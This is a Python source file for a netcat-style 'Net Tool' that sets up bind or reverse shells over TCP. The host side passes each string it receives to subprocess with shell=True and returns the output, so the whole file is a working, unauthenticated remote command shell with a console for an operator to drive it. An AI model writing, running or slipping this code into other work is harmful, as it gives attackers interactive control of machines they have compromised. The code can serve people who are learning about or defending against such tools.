import argparse
import os
import socket
import subprocess 
import sys
#import textwrap
import threading


class Shell:
    def __init__(self,args,buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.server:
            self.server()
        else:            
            self.client()

    def client(self):
        # reverse shell --> open listener .  bind shel --> connect to lisitner
        if self.args.reverse: 
            self.socket,addr = self.bind(reverse=True)
        else :
            self.connect()

        # Client Logic   , Server Is First To Initaite Connection
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data =self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                        ### T  hats It
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except (KeyboardInterrupt,EOFError):
            print('')
            sys.exit('User terminated.')





    def server(self):
        # is revere shell ? connect to peer and open handler 
        if self.args.reverse:
            self.connect()
            print(f'Connected to client')
            client_thread = threading.Thread(target=self.shell_handler, args=(self.socket,self.args.target,))
            client_thread.start()

        # is bind shell ? connect to peer and open handler
        else :
            self.bind()
            while True:
                client_socket, addr = self.socket.accept()
                print(f"Connection Initiated {addr[0]}:{addr[1]}")
                client_thread = threading.Thread(target=self.shell_handler, args=(client_socket,addr,))
                client_thread.start()



    def shell_handler(self,client_socket,addr):
        try:
            # Intiate Connection To Client
            client_socket.send(b"Connection Established")
            while True:
                # recive command (input) from client 
                data = client_socket.recv(4096)
                if not data: 
                    (print(f'client {addr[0]} Discconected'))
                    break

                command = data.decode().strip()

                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        output = f'Changed dir to {os.getcwd()}'
                    except PermissionError:
                        output = f'No Permission'
                    except FileNotFoundError:
                        output = f'File / Directory Not Found'

                else :
                    output = self.execute(command)
                # send output to client
                client_socket.send(output.encode())
        except (KeyboardInterrupt,EOFError):
            print('')
            sys.exit('User terminated.')


    def execute(self,cmd):
       
        cmd = cmd.strip()
        if not cmd:
            return
        else :
            output = subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
            return (output.stdout.decode())

    def bind(self,reverse=False):
        self.socket.bind((self.args.target,self.args.port))
        self.socket.listen(5)
        print('Waiting For Connection')
        if reverse:
            client_socket, addr = self.socket.accept()
            return client_socket , addr

    def connect(self):
        try :
            self.socket.connect((self.args.target,self.args.port))
        except ConnectionRefusedError:
            sys.exit('No connection to second peer')
            


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Net Tool')
    parser.add_argument('-s','--server',action='store_true',help='Server Mode')
    parser.add_argument('-p','--port',type=int,help='Specify Port')
    parser.add_argument('-t','--target',help='Specify Target Ip')
    parser.add_argument('-r','--reverse',action='store_true',help='reverse shell')
    #parser.add_argument('-e','--execute',help='Execute Spesified Command')
    #parser.add_argument('-c','--command',action='store_true',help='Command Shell')
    args = parser.parse_args()

    sh = Shell(args)
    sh.run()